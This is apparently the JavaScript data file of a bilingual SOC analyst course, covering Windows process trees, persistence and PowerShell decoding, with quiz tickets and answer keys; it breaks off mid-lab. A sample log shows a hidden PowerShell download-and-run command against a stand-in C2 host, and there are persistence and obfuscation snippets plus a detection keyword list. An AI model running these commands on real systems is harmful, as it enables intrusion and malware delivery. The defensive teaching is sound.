// Stage 2: Windows Internals, Active Directory & Linux (إتقان أنظمة التشغيل وبيئة الشركات)
// Curated with exhaustive encyclopedic depth for Eng. Bashar Hafedh - BasharSec Academy

const module2Data = {
  id: "module2",
  stageNumber: 2,
  titleAr: "المرحلة 2: إتقان أنظمة التشغيل وبيئة الشركات (Windows, Active Directory & Linux)",
  titleEn: "Stage 2: Windows Internals, Active Directory & Linux for SOC Analysts",
  summaryAr: "تشريح محرك أنظمة التشغيل من الداخل: شجرة العمليات في ويندوز، خبايا الدليل النشط وبروتوكولات Kerberos، وطرق البقاء Persistence، وأوامر لينكس الجنائية.",
  summaryEn: "Under the hood of enterprise operating systems: Windows process trees, Active Directory architecture & Kerberos authentication, persistence mechanics, and Linux log forensics.",
  badgeAr: "خبير أنظمة الشركات والـ AD",
  badgeEn: "Enterprise OS & AD Specialist",
  icon: "terminal",
  lessons: [
    {
      id: "lesson-2-1",
      moduleId: "module2",
      number: "2.1",
      titleAr: "نظام Windows من الداخل لمحلل الـ SOC: شجرة العمليات الأب والابن واكتشاف التزييف",
      titleEn: "Windows Internals for SOC: Parent-Child Process Trees & Masquerading Detection",
      duration: "65 min",
      theoryAr: `
<h3>شجرة عائلة العمليات في ويندوز: من يلد من؟ وكيف تميز الابن الشرعي من الجاسوس؟</h3>
<p class="lead">عندما يضغط المستخدم على أي برنامج في ويندوز، لا يظهر البرنامج من العدم! بل هناك دائماً "عملية أب" (Parent Process) استدعت هذا البرنامج وأنجبت "عملية ابن" (Child Process). إتقان شجرة العمليات الطبيعية (Process Baseline) هو السلاح الأقوى لمحلل الـ SOC لاكتشاف أخطر الهجمات في ثانية واحدة!</p>

<div class="analogy-card">
  <div class="analogy-header">💡 تشبيه من الواقع: شجرة العائلة الرسمية وسجل المواليد</div>
  <p>في الدولة المنظمة، كل مواطن له أب معروف مسجل في شهادة الميلاد. إذا جاءك شخص يدعي أنه أمير العائلة الحاكمة، ولكن عندما راجعت شهادة ميلاده وجدت أن والده هو لص هارب، فستعرف فوراً أنه منتحل ومزور!</p>
  <p>في نظام ويندوز، كل عملية نظام رسمية لها "أب شرعي واحد فقط" ولها "مسار مجلد واحد فقط" ولها "حساب مستخدم محدد". إذا رأيت عملية مثل <code>svchost.exe</code> تعمل من خارج مجلد <code>System32</code>، أو كان والدها هو برنامج <code>Microsoft Word</code>، فأنت أمام برمجية خبيثة مؤكدة 100%!</p>
</div>

<h4>شجرة العمليات القياسية لنظام ويندوز من لحظة الضغط على زر التشغيل (The Sacred Windows Boot Tree):</h4>

<pre class="ascii-flow">
[ System ] (PID 4 - Kernel Mode)
   │
   └── [ smss.exe ] (Session Manager Subsystem)
          │
          ├── [ smss.exe ] (Session 0 - Services Session)
          │      │
          │      ├── [ wininit.exe ] (Windows Initialization)
          │      │      ├── [ services.exe ] (Service Control Manager)
          │      │      │      ├── [ svchost.exe ] (تستضيف خدمات ويندوز - أب لخدمات عديدة)
          │      │      │      └── [ spoolsv.exe ] (خدمة الطباعة)
          │      │      │
          │      │      ├── [ lsass.exe ] (Local Security Authority Subsystem)
          │      │      │      └── [حارس كلمات المرور والتوثيق والهاشات - لا أبناء له عادة]
          │      │      │
          │      │      └── [ lsm.exe ] (Local Session Manager)
          │      │
          │      └── [ csrss.exe ] (Client/Server Runtime Subsystem - Session 0)
          │
          └── [ smss.exe ] (Session 1 - Interactive User Session)
                 │
                 ├── [ winlogon.exe ] (شاشة تسجيل الدخول والمستخدم)
                 │      └── [ logonui.exe ]
                 │
                 └── [ csrss.exe ] (Session 1)
                        │
                        └── [ explorer.exe ] (واجهة سطح المكتب وشريط المهام)
                               ├── [ chrome.exe ]
                               ├── [ WINWORD.EXE ]
                               └── [ powershell.exe / cmd.exe ]
</pre>

<h4>جدول التشريح الجنائي للعمليات الأساسية (Baseline Identification Guide):</h4>

<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>اسم العملية</th>
        <th>المسار الحصري في القرص</th>
        <th>العملية الأب الشرعية (Parent)</th>
        <th>عدد النسخ المسموح</th>
        <th>الحساب المشغل (User)</th>
        <th>العلامات الحمراء التي تشير لاختراق (Red Flags)</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>System</strong></td>
        <td>لا يوجد (يعمل داخل نواة الكيرنل)</td>
        <td>لا يوجد (PID دائم = 4)</td>
        <td>نسخة واحدة فقط</td>
        <td>SYSTEM</td>
        <td>أن يكون الـ PID غير 4، أو أن يتصل System مباشرة بالإنترنت عبر منافذ غير معروفة.</td>
      </tr>
      <tr>
        <td><strong>smss.exe</strong></td>
        <td><code>C:\\Windows\\System32\\smss.exe</code></td>
        <td>System</td>
        <td>نسخة رئيسية ونسخ مؤقتة تغلق فوراً</td>
        <td>SYSTEM</td>
        <td>استمرار عمل نسخ الجلسات الفرعية أو عملها من خارج System32.</td>
      </tr>
      <tr>
        <td><strong>csrss.exe</strong></td>
        <td><code>C:\\Windows\\System32\\csrss.exe</code></td>
        <td>smss.exe (ولكن smss يغلق فيظهر كأنه بدون أب)</td>
        <td>نسختان أو أكثر (واحدة لكل جلسة)</td>
        <td>SYSTEM</td>
        <td>أن يكون الأب عملية أخرى غير smss، أو أن يستهلك المعالج بشكل غير طبيعي.</td>
      </tr>
      <tr>
        <td><strong>wininit.exe</strong></td>
        <td><code>C:\\Windows\\System32\\wininit.exe</code></td>
        <td>smss.exe</td>
        <td>نسخة واحدة فقط</td>
        <td>SYSTEM</td>
        <td>أن يكون لها أبناء غير services.exe و lsass.exe و lsm.exe.</td>
      </tr>
      <tr>
        <td><strong>services.exe</strong></td>
        <td><code>C:\\Windows\\System32\\services.exe</code></td>
        <td>wininit.exe</td>
        <td>نسخة واحدة فقط</td>
        <td>SYSTEM</td>
        <td>أن يكون الأب أي شيء غير wininit، أو تشغيل cmd.exe كابن مباشر لـ services.exe!</td>
      </tr>
      <tr>
        <td><strong>lsass.exe</strong></td>
        <td><code>C:\\Windows\\System32\\lsass.exe</code></td>
        <td>wininit.exe</td>
        <td>نسخة واحدة فقط دائماً!</td>
        <td>SYSTEM</td>
        <td><strong>الهدف رقم واحد في العالم للهكر!</strong> وجود أكثر من نسخة، أو قيام أي برنامج غير مصرح به بطلب قراءة ذاكرة lsass لسرقة الهاشات (Mimikatz).</td>
      </tr>
      <tr>
        <td><strong>svchost.exe</strong></td>
        <td><code>C:\\Windows\\System32\\svchost.exe</code></td>
        <td>services.exe فقط!</td>
        <td>عشرات النسخ النشطة في نفس الوقت</td>
        <td>SYSTEM / LOCAL SERVICE / NETWORK SERVICE</td>
        <td>أن يكون مسارها <code>C:\\Windows\\svchost.exe</code> (بدون System32)، أو أن يكون والدها explorer.exe أو Word، أو كتابتها بحروف خبيثة مثل <code>scvhost.exe</code>!</td>
      </tr>
      <tr>
        <td><strong>explorer.exe</strong></td>
        <td><code>C:\\Windows\\explorer.exe</code></td>
        <td>userinit.exe (يغلق فوراً فيظهر Explorer بدون أب)</td>
        <td>نسخة واحدة لكل مستخدم مسجل دخوله</td>
        <td>اسم المستخدم المسجل (Logged on User)</td>
        <td>أن تعمل تحت حساب SYSTEM أو أن تتصل خارجياً بروابط C2 بدون تصفح من المستخدم.</td>
      </tr>
    </tbody>
  </table>
</div>
      `,
      theoryEn: `<h3>Windows Internals for SOC: Parent-Child Relationships, Process Trees & Masquerading</h3>`,
      attackDefenseAr: `
<h3>حيل المهاجمين في التنكر (Process Masquerading & Injection):</h3>
<div class="battle-grid">
  <div class="attacker-side">
    <h4>🔴 كيف يختبئ الهكر داخل العمليات؟</h4>
    <ul>
      <li><strong>التنكر الإملائي (Typosquatting Masquerading):</strong> تسمية الملف الخبيث بأسماء قريبة جداً للعين المجردة لتضليل المحلل المبتدئ: <code>svch0st.exe</code> (استبدال o برقم صفر)، أو <code>scvhost.exe</code>، أو <code>csrs.exe</code>!</li>
      <li><strong>تفريغ واستبدال العملية (Process Hollowing):</strong> يقوم الهكر بتشغيل عملية شرعية حقيقية مثل <code>svchost.exe</code> في حالة تعليق (Suspended State)، ثم يقوم بتفريغ كودها الأصلي من الذاكرة وحقن بايلود خبيث مكانه واستئناف التشغيل! يظهر في مدير المهام كأنه svchost شرعي، ولكنه في الحقيقة ينفذ أوامر الاختراق.</li>
      <li><strong>علاقة الأب الشاذة (Anomalous Parent-Child):</strong> قيام برنامج Word أو Excel باستدعاء <code>powershell.exe</code> أو <code>cmd.exe</code>. هذا مؤشر قطعي على وثيقة تصيد احتيالي خبيثة تحمل كود Macro خبيث!</li>
    </ul>
  </div>
  <div class="defender-side">
    <h4>🟢 كيف يكتشف محلل الـ SOC هذه الحيل؟</h4>
    <ul>
      <li><strong>سجلات Sysmon Event ID 1 (Process Creation):</strong> مراقبة حقل <code>ParentImage</code> و <code>CommandLine</code>. إذا رأيت: <code>ParentImage = WINWORD.EXE</code> و <code>Image = cmd.exe</code> فهذا إنذار فوري P1!</li>
      <li><strong>التأكد من التوقيع الرقمي (Digital Signature Verification):</strong> جميع ملفات النظام الأصلية لمايكروسوفت موقعة رقمياً بشهادة رسمية (Verified Microsoft Windows Publisher). الملفات المزيفة لن تحمل هذا التوقيع أو ستكون غير موقعة.</li>
    </ul>
  </div>
</div>
      `,
      attackDefenseEn: `<h3>Attacker vs Defender: Process Hollowing, Masquerading vs Sysmon Parent Tracking</h3>`,
      labAr: `
<div class="lab-workspace">
  <div class="lab-instructions">
    <h4>🧪 المعمل التطبيقي 2.1: فحص شجرة العمليات وتدقيق الـ Parent Process</h4>
    <p>استخدم محاكي أدوات Sysinternals (Process Explorer / wmic process) لكشف العمليات المزيفة في الذاكرة.</p>
  </div>
  <div class="terminal-box">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> basharsec@soc-workstation:~$</div>
    <div class="terminal-body" id="lab-term-2-1">
      <div class="term-line output">Windows Process Telemetry Engine v3.0</div>
      <div class="term-line output">Type 'wmic process get name,parentprocessid,processid' or 'ps-tree'.</div>
    </div>
  </div>
  <div class="quick-commands">
    <button class="btn-cmd" onclick="runSimCommand('wmic process get name,parentprocessid,processid', 'lab-term-2-1')">wmic process list (Inspect Parents)</button>
    <button class="btn-cmd" onclick="runSimCommand('Get-Process -Name svchost | Select Id, Path, Company', 'lab-term-2-1')">Verify svchost Paths & Signatures</button>
  </div>
</div>
      `,
      labEn: `<p>Interactive Windows Process Tree analysis and anomaly hunting.</p>`,
      ticket: {
        ticketId: "SEC-TICK-201",
        severity: "CRITICAL",
        severityClass: "critical",
        sourceHost: "EXEC-PC-01.corp.local",
        timestamp: "2026-11-06 09:12:40 UTC",
        ruleTriggered: "EDR_SUSPICIOUS_CHILD_PROCESS_OFFICE_SPAWN",
        rawLog: `Event: Sysmon Event ID 1 (Process Creation)
UtcTime: 2026-11-06 09:12:40.119
ProcessId: 6420
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: "powershell.exe" -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('http://malicious-c2-update.cc/payload.exe', '$env:TEMP\\update.exe'); Start-Process '$env:TEMP\\update.exe'"
ParentProcessId: 3812
ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE
ParentCommandLine: "EXCEL.EXE" "C:\\Users\\ceo\\Downloads\\Q3_Executive_Bonus_Report.xlsm"
User: CORP\\ceo.executive
Hashes: SHA256=4A2B8C9D...`,
        questionAr: "بصفتك محلل SOC، حلل علاقة العملية الأب بالعملية الابن في السجل أعلاه الصادر من لابتوب الرئيس التنفيذي. ما هو الحكم الحاسم لهذا التنبيه؟",
        questionEn: "Analyze the parent-child relationship above from the CEO's laptop. What is your conclusive triage verdict?",
        optionsAr: [
          "برنامج إكسل يقوم بتحديث معادلات الحسابات بشكل تلقائي مشروع.",
          "هجوم تصيد حقيقي وخبيث جداً (True Positive): ملف إكسل خبيث محمل بماكرو (Malicious Macro Document) قام باستدعاء PowerShell في الخلفية لتنزيل بايلود خبيث وتشغيله من مجلد Temp.",
          "المستخدم قام بفتح ملف تكست عادي.",
          "تنبيه كاذب من نظام مكافحة الفيروسات."
        ],
        optionsEn: [
          "Normal Excel formula calculation.",
          "Critical True Positive: Weaponized Excel document executing macro to spawn hidden PowerShell, downloading malicious executable from external C2.",
          "User opening a benign text file.",
          "Antivirus false alarm."
        ],
        correctIndex: 1,
        explanationAr: "تحليل عبقري يا باشمهندس بشار! هذا التنبيه يمثل التهديد الأخطر في شاشات الـ SOC: برنامج EXCEL.EXE لا يجب في الطبيعي أبداً أن يستدعي powershell.exe! اسم الملف 'Q3_Executive_Bonus_Report.xlsm' يحتوي على ماكرو خبيث استهدف المدير التنفيذي (Spear Phishing)، وبمجرد تفعيل المحتوى قام الماكرو باستدعاء PowerShell مخفي لتنزيل الفايروس إلى مجلد Temp وتشغيله. الإجراء: عزل لابتوب المدير التنفيذي فوراً، حظر الدومين الخبيث، وبدء إجراءات احتواء الحادث.",
        explanationEn: "Spot on! Office applications (EXCEL.EXE) spawning PowerShell with hidden arguments downloading binaries from external IP/domains is the definitive signature of a weaponized macro attack."
      }
    },

    {
      id: "lesson-2-2",
      moduleId: "module2",
      number: "2.2",
      titleAr: "سجل النظام (Registry) والخدمات والمهام المجدولة: كيف يحقق الهكر البقاء (Persistence)؟",
      titleEn: "Windows Registry, Services, Scheduled Tasks & Persistence Mechanics",
      duration: "65 min",
      theoryAr: `
<h3>عقد البقاء الأبدي: كيف يضمن المهاجم أن فايروسه سيعود للعمل حتى لو أطفأت الجهاز؟</h3>
<p class="lead">أول قاعدة يتعلمها الهاكر بعد كسر الجهاز هي: "الأجهزة يُعاد تشغيلها!" إذا نجح المهاجم في التسلل، ولكن بمجرد إعادة تشغيل الموظف لجهازه مات اتصاله، فكأنه لم يفعل شيئاً. لذلك، يبحث الهكر عن آليات تسمى <strong>البقاء (Persistence)</strong> ليعود الفايروس للعمل تلقائياً مع إقلاع النظام!</p>

<div class="analogy-card">
  <div class="analogy-header">💡 تشبيه من الواقع: المفتاح الإضافي وخادم الباب</div>
  <p>إذا اقتحم لص منزلك ليلاً وأردت طرده، ستقوم بقفل الباب وراءه. ولكن ماذا لو قام اللص أثناء وجوده بنسخ مفتاح إضافي للباب الخلفي، أو اتفق مع بواب العمارة أن يفتح له النافذة كل صباح في الساعة 8 صباحاً؟</p>
  <p>في ويندوز، سجل النظام (Registry) والمهام المجدولة (Scheduled Tasks) والخدمات (Services) هي تلك الأبواب الخلفية التي يستغلها الهكر للعودة للجهاز بصمت!</p>
</div>

<h4>1. سجل نظام ويندوز (Windows Registry) - قاعدة البيانات العظمى:</h4>
<p>سجل النظام هو القلب الإداري لويندوز، يحتوي على جميع إعدادات النظام وتفضيلات البرامج. ينقسم إلى 5 خلايا رئيسية (Hives):</p>
<ul>
  <li><code>HKEY_LOCAL_MACHINE (HKLM):</code> الإعدادات العامة لجميع مستخدمي الحاسوب ومكونات العتاد.</li>
  <li><code>HKEY_CURRENT_USER (HKCU):</code> تفضيلات المستخدم المسجل دخوله حالياً.</li>
  <li><code>HKEY_CLASSES_ROOT (HKCR):</code> ارتباطات لواحق الملفات (File Associations).</li>
  <li><code>HKEY_USERS (HKU):</code> تفضيلات جميع ملفات المستخدمين المحفوظة في الجهاز.</li>
  <li><code>HKEY_CURRENT_CONFIG (HKCC):</code> التكوين العتادي الفعال لجلسة التشغيل الحالية.</li>
</ul>

<h4>أشهر مفاتيح الريجستري التي يستغلها الهكر للبقاء (Run Keys & Startup):</h4>
<p>أي برنامج يُكتب مساره داخل هذه المفاتيح يقلع تلقائياً بمجرد تسجيل الدخول لويندوز:</p>
<pre class="ascii-flow">
1. HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  (يعمل لجميع المستخدمين بصلاحية عالية)
2. HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  (يعمل للمستخدم الحالي دون الحاجة لصلاحيات مدير Admin!)
3. HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce (يعمل لمرة واحدة فقط عند الإقلاع القادم)
</pre>

<h4>2. الخدمات (Windows Services) وكيف تستغل:</h4>
<p>الخدمات هي برامج تعمل في الخلفية بدون واجهة مستخدم وتبدأ قبل تسجيل دخول المستخدمين وتعمل غالباً بأعلى صلاحية في الكون: <code>NT AUTHORITY\\SYSTEM</code>!</p>
<p>يستغلها المهاجمون عبر طريقتين:</p>
<ul>
  <li><strong>إنشاء خدمة خبيثة جديدة:</strong> (يُسجل في أحداث ويندوز بالرقم <strong>Event ID 7045</strong> أو <strong>4697</strong>). ينشئ الهكر خدمة تشغل ملف الفايروس من مجلد مؤقت.</li>
  <li><strong>تعديل مسار خدمة شرعية غير مقتبسة (Unquoted Service Path):</strong> إذا كان مسار الخدمة يحتوي على مسافات بدون علامات اقتباس مثل <code>C:\\Program Files\\My Service\\run.exe</code>، يستطيع الهكر وضع ملف خبيث باسم <code>C:\\Program.exe</code> ليقوم ويندوز بتشغيله بدلاً من الخدمة الأصلية!</li>
</ul>

<h4>3. المهام المجدولة (Scheduled Tasks - schtasks.exe):</h4>
<p>أداة مجدولة لجدولة تشغيل البرامج في أوقات معينة (مثل كل يوم في الساعة 3 صباحاً أو عند قفل الشاشة). يفضلها المهاجمون لأنها تسمح بتشغيل الأوامر الخبيثة بشكل دوري كل بضع دقائق لضمان عدم انقطاع جلسة الـ C2.</p>
      `,
      theoryEn: `<h3>Windows Registry, Scheduled Tasks & Persistence Mechanism Analysis</h3>`,
      attackDefenseAr: `
<h3>منظور المهاجم والمدافع: معركة البقاء في أحشاء النظام</h3>
<div class="battle-grid">
  <div class="attacker-side">
    <h4>🔴 ترسانة الهكر لتثبيت البقاء</h4>
    <ul>
      <li><strong>التخفي في مفاتيح Run:</strong> إضافة قيمة جديدة في <code>HKCU\\...\\Run</code> باسم بريء مثل <code>OneDriveUpdate</code> ولكنها تشير إلى ملف خبيث في مسار <code>AppData\\Roaming</code>.</li>
      <li><strong>جدولة مهام مخفية:</strong> إنشاء مهمة عبر سطر الأوامر: <code>schtasks /create /sc minute /mo 30 /tn "SystemMaintenance" /tr "powershell -w hidden..."</code> لطلب بايلود جديد كل 30 دقيقة.</li>
      <li><strong>تقنية DLL Side-Loading:</strong> وضع مكتبة خبيثة بجانب برنامج شرعي معروف لتشغيلها تلقائياً عند إقلاعه.</li>
    </ul>
  </div>
  <div class="defender-side">
    <h4>🟢 رادارات محلل الـ SOC لكشف البقاء</h4>
    <ul>
      <li><strong>Sysmon Event ID 12 & 13 (Registry Event):</strong> مراقبة فورية لأي عملية تكتب في مسارات <code>...\\CurrentVersion\\Run</code>.</li>
      <li><strong>Windows Event ID 7045 (A new service was installed):</strong> فحص اسم الخدمة ومسار الملف الثنائي ImagePath؛ إذا كان المسار خارج <code>C:\\Program Files</code> أو <code>System32</code>، فهذا مؤشر خطر أحمر!</li>
      <li><strong>أداة Autoruns من Sysinternals:</strong> الأداة الذهبية لفحص كل نقطة إقلاع تلقائي في ويندوز ومقارنة التواقيع الرقمية.</li>
    </ul>
  </div>
</div>
      `,
      attackDefenseEn: `<h3>Attacker vs Defender: Persistence Techniques vs Sysmon/Event 7045 Auditing</h3>`,
      labAr: `
<div class="lab-workspace">
  <div class="lab-instructions">
    <h4>🧪 المعمل التطبيقي 2.2: تدقيق مفاتيح التشغيل التلقائي والمهام المجدولة</h4>
    <p>استخدم الأوامر الجنائية لفحص مفاتيح الـ Run والخدمات المضافة حديثاً.</p>
  </div>
  <div class="terminal-box">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> basharsec@soc-workstation:~$</div>
    <div class="terminal-body" id="lab-term-2-2">
      <div class="term-line output">Windows Registry & Persistence Telemetry Console</div>
      <div class="term-line output">Type 'reg query run' or 'schtasks /query /fo list' to discover persistence.</div>
    </div>
  </div>
  <div class="quick-commands">
    <button class="btn-cmd" onclick="runSimCommand('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'lab-term-2-2')">Query Run Keys</button>
    <button class="btn-cmd" onclick="runSimCommand('schtasks /query /fo LIST /v', 'lab-term-2-2')">Inspect Scheduled Tasks</button>
    <button class="btn-cmd" onclick="runSimCommand('Get-Service | Where-Object Status -eq Running', 'lab-term-2-2')">Inspect Running Services</button>
  </div>
</div>
      `,
      labEn: `<p>Interactive Registry run key and scheduled task inspection.</p>`,
      ticket: {
        ticketId: "SEC-TICK-202",
        severity: "HIGH",
        severityClass: "high",
        sourceHost: "SRV-FILE-02.corp.local",
        timestamp: "2026-11-06 10:44:11 UTC",
        ruleTriggered: "WINDOWS_EVENT_7045_SUSPICIOUS_SERVICE_INSTALLED",
        rawLog: `Event: Windows System Log (EventID: 7045)
TimeCreated: 2026-11-06 10:44:11.302
ComputerName: SRV-FILE-02.corp.local
ServiceName: WindowsSecurityUpdaterHealth
ImagePath: %SystemRoot%\\Temp\\svchost_net.exe -k -svc
ServiceType: user mode service
StartType: auto start
AccountName: LocalSystem
AssociatedEvents: Sysmon ID 11 (FileCreate in C:\\Windows\\Temp\\svchost_net.exe 30 seconds prior by user CORP\\j.doe)`,
        questionAr: "تلقيت تنبيهاً للحدث 7045 يوثق تثبيت خدمة جديدة باسم WindowsSecurityUpdaterHealth. ما هو الشذوذ القاطع في هذا السجل الذي يثبت وجود اختراق وبقاء خبيث (Persistence)؟",
        questionEn: "What decisive anomaly in the Event 7045 log confirms malicious persistence?",
        optionsAr: [
          "أن نوع الخدمة هو auto start.",
          "أن الخدمة تعمل بحساب LocalSystem وهو حساب طبيعي.",
          "مسار الملف التنفيذي ImagePath يشير إلى مجلد C:\\Windows\\Temp باسم مزور svchost_net.exe، والملف تم إنشاؤه بواسطة حساب موظف عادي قبل 30 ثانية فقط لتثبيت البقاء بصلاحية SYSTEM!",
          "أن رقم الحدث هو 7045."
        ],
        optionsEn: [
          "Service start type is auto start.",
          "Account name is LocalSystem.",
          "Executable path is located in C:\\Windows\\Temp with masqueraded svchost name created 30s prior by standard user to gain persistence at SYSTEM level.",
          "Event ID is 7045."
        ],
        correctIndex: 2,
        explanationAr: "رائع جداً يا باشمهندس بشار! هذا هو التفكير الجنائي الأصيل: خدمات مايكروسوفت الرسمية لا توضع أبداً في مجلد Temp! المهاجم استغل حساب الموظف j.doe لإسقاط الملف في C:\\Windows\\Temp وأطلق عليه اسماً خبيثاً svchost_net.exe، ثم ثبته كخدمة تعمل تلقائياً بصلاحيات كاملة LocalSystem لضمان استمرار السيطرة على السيرفر حتى بعد إعادة التشغيل.",
        explanationEn: "Spot-on! Legitimate OS services are never executed out of Temp folders. Staging a fake svchost executable in C:\\Windows\\Temp configured for Auto-Start as LocalSystem is textbook adversary persistence."
      }
    },

    {
      id: "lesson-2-3",
      moduleId: "module2",
      number: "2.3",
      titleAr: "سطر أوامر ويندوز و PowerShell للمحللين وتحليل الأوامر المشفرة بـ Base64",
      titleEn: "Windows CLI & PowerShell for Analysts: Decoding Base64 & Execution Policies",
      duration: "65 min",
      theoryAr: `
<h3>سلاح المهاجم المفضل ورادار المدافع: إتقان PowerShell الجنائي</h3>
<p class="lead">لماذا يحتاج الهكر لبرمجة فايروس جديد إذا كان نظام ويندوز يأتي مزوداً بأقوى لغة برمجة وأتمتة في العالم (PowerShell) ومثبتة مسبقاً وتعمل بصلاحيات عالية؟ هذا ما يُعرف في الأمن السيبراني بمصطلح <strong>العيش على خيرات الأرض (Living Off The Land - LOLBins)</strong>!</p>

<div class="analogy-card">
  <div class="analogy-header">💡 تشبيه من الواقع: صندوق أدوات الصيانة المستخدم للسطو</div>
  <p>تخيل رجل صيانة يحمل صندوق أدوات رسمي به مطرقة ومنشار ومفك براغي للدخول إلى العمارة لإصلاح الأنابيب. إذا استخدم نفس المطرقة لكسر خزنة البنك، فالمشكلة ليست في المطرقة بل في طريقة استخدامها!</p>
  <p>برنامج PowerShell هو صندوق أدوات المهندسين المعتمد، لكن المهاجمين يستخدمونه لتنزيل الفيروسات، قراءة الذاكرة، والتنقل في الشبكة. بصفتك محلل SOC، فإن أكثر من 70% من التنبيهات التي ستحقق فيها يومياً تحتوي على أوامر PowerShell مشفرة يجب عليك فكها وقراءتها سطراً بسطر!</p>
</div>

<h4>1. سياسات التنفيذ في PowerShell (Execution Policies):</h4>
<p>صممت مايكروسوفت سياسة التنفيذ لحماية المستخدمين من تشغيل السكربتات الخاطئة بالخطأ، ولكنها <strong>ليست حاجزاً أمنياً (Security Boundary)</strong>، لأن أي مهاجم يستطيع تجاوزها بكلمة واحدة في سطر الأوامر:</p>
<ul>
  <li><code>Restricted:</code> تمنع تشغيل أي سكربتات (.ps1) نهائياً (الوضع الافتراضي في بعض أنظمة ويندوز القديمة).</li>
  <li><code>RemoteSigned:</code> تسمح بتشغيل السكربتات المحلية، وتتطلب توقيعاً رقمياً للسكربتات المحملة من الإنترنت.</li>
  <li><code>Unrestricted / Bypass:</code> لا توجد أي قيود، يتم تنفيذ أي كود دون أي سؤال أو تحذير!</li>
</ul>
<p>علامة حمراء لمحلل الـ SOC: عندما ترى أمراً يبدأ بـ: <code>powershell.exe -ExecutionPolicy Bypass</code> أو <code>-ep bypass</code>، فهذا مؤشر صريح على محاولة لتجاوز القيود وتشغيل كود غير موثق!</p>

<h4>2. لماذا يشفر المهاجمون الأوامر بـ Base64؟ (-EncodedCommand / -enc):</h4>
<p>يدعم PowerShell معاملاً يسمى <code>-EncodedCommand</code> (أو اختصاراً <code>-enc</code> أو <code>-e</code>)، يتيح للمستخدم تمرير الأوامر المعقدة كسلسلة نصية مشفرة بـ <strong>Base64 بتنسيق Unicode (UTF-16LE)</strong>. يستغل المهاجمون هذه الميزة لسببين:</p>
<ol>
  <li>الهروب من علامات التنصيص والرموز الخاصة التي قد تكسر سطر الأوامر.</li>
  <li>إخفاء الأوامر الخبيثة وروابط الـ C2 عن أعين برامج مكافحة الفيروسات البسيطة وسجلات الأحداث الظاهرة.</li>
</ol>

<h4>3. المعاملات الشائعة للسكربتات الخبيثة (Adversary PowerShell Flags):</h4>
<pre class="ascii-flow">
powershell.exe -nop -w hidden -ep bypass -enc aQBlAHgA...
  │             │      │          │         └── الكود المشفر بـ Base64
  │             │      │          └── تجاوز سياسة التنفيذ (ExecutionPolicy Bypass)
  │             │      └── إخفاء نافذة الشاشة السوداء عن الضحية (-WindowStyle Hidden)
  │             └── عدم تحميل ملف التفضيلات للمستخدم (-NoProfile لتسريع الإقلاع)
  └── اختصار -NonInteractive (منع طلب أي تفاعل من المستخدم)
</pre>

<h4>4. كيف يفك محلل الـ SOC تشفير Base64 يدوياً في ثانية واحدة؟</h4>
<p>في سطر أوامر PowerShell الخاص بجهاز التحقيق، نستخدم هذا السطر الذهبي لفك أي كود مشفر:</p>
<pre class="ascii-flow">
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("BASE64_STRING_HERE"))
</pre>
      `,
      theoryEn: `<h3>PowerShell Internals, LOLBins, Base64 Encoding & Execution Policy Bypasses</h3>`,
      attackDefenseAr: `
<h3>منظور المهاجم والمدافع: فك شفرات الهكر وكشف التخفي</h3>
<div class="battle-grid">
  <div class="attacker-side">
    <h4>🔴 أساليب المهاجم في التخفي عبر PowerShell</h4>
    <ul>
      <li><strong>التنفيذ المباشر في الذاكرة عبر IEX:</strong> استخدام دالة <code>IEX (Invoke-Expression)</code> مع <code>DownloadString</code> لتحميل السكربت من سيرفر الهكر وتشغيله في الذاكرة دون كتابة بايت واحد على القرص الصلب!</li>
      <li><strong>التعتيم وتقطيع الكلمات (Obfuscation):</strong> تقطيع الكلمات بأقواس وعلامات زائد مثل: <code>&('In'+'voke-Exp'+'ression')</code> لتضليل محركات البحث عن الكلمات المفتاحية.</li>
    </ul>
  </div>
  <div class="defender-side">
    <h4>🟢 أسلحة المدافع ومحلل الـ SOC</h4>
    <ul>
      <li><strong>تفعيل Script Block Logging (Event ID 4104):</strong> ميزة جبارة في ويندوز تسجل الكود النهائي بعد فك تشفيره في الذاكرة! حتى لو شفر الهكر أمره بـ 10 طبقات من التعتيم، فإن الحدث 4104 سيكتبه لك كنص واضح مقروء في سجلات PowerShell!</li>
      <li><strong>رصد أوامر التنزيل المشبوهة:</strong> قواعد تنبيه في الـ SIEM تبحث عن: <code>Net.WebClient</code>, <code>DownloadFile</code>, <code>DownloadString</code>, <code>Invoke-WebRequest</code>, <code>curl</code>, <code>wget</code> داخل أوامر الـ CLI.</li>
    </ul>
  </div>
</div>
      `,
      attackDefenseEn: `<h3>Attacker vs Defender: PowerShell Obfuscation vs Script Block Logging (Event 4104)</h3>`,
      labAr: `
<div class="lab-workspace">
  <div class="lab-instructions">
    <h4>🧪 المعمل التطبيقي 2.3: فك تشفير أوامر PowerShell المشفرة في المحاكي</h4>
    <p>تدرب على فك تشفير سلاسل Base64 المشبوهة واستخراج رابط الـ C2 الخبيث.</p>
  </div>
  <div class="terminal-box">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> basharsec@soc-workstation:~$</div>
    <div class="terminal-body" id="lab-term-2-3">
      <div class="term-line output">PowerShell Forensic Deobfuscator Shell</div>
      <div class="term-line output">Type 'decode-base64 &lt;string&gt;' or run test sample commands.</div>
    </div>
  </div>
  <div class="quick-commands">
